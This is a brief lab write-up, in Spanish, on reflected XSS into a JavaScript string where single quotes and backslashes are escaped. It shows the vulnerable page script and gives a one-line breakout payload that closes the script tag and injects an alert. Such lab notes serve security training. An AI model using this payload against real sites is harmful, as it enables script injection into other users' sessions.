---
title: "18 - Reflected XSS into a JavaScript string with single quote and backslash escaped"
---

# 18 - Reflected XSS into a JavaScript string with single quote and backslash escaped

https://youtu.be/OwcT9ahQlSU

```html
<script>
    var searchTerms = 'gergrteghetrh';
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```

Otra forma de escapar de un string de javascript es tal cuál usando
`</script><script>alert()</script>//` , se puede escapar del string de javascript con la etiqueta de cierre de script
